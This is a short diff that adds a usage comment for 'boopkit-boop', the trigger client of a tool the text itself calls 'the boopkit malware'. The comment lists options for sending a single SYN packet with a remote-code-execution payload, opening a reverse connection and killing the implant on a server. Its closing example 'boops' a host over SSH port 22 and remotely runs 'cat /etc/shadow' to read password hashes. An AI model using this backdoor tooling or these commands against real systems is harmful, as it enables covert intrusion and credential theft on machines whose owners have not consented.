@@ -1,0 +1,20 @@
+/!
+/!
+### boopkit-boop [options]
+/!
+// Options:
+// -lhost             Local  (src) address   : 127.0.0.1.
+// -lport             Local  (src) port      : 3535
+// -rhost             Remote (dst) address   : 127.0.0.1.
+// -rport             Remote (dst) port      : 22
+// -9, halt/kill      Kill the boopkit malware on a server.
+// -c, command        Remote command to exec : ls -la
+// -h, help           Print help and usage.
+// -q, quiet          Disable output.
+// -r, reverse-conn   Serve the RCE on lhost:lport after a boop.
+// -x, syn-only       Send a single SYN packet with RCE payload.
+//
+// # Boop the server over ssh(22) and execute a command.
+// boopkit-boop -x -lhost 10.6.6.100 -lport 3535 -rhost 10.6.6.200 -rport 22 \
+//      -c "cat /etc/shadow"
+/!
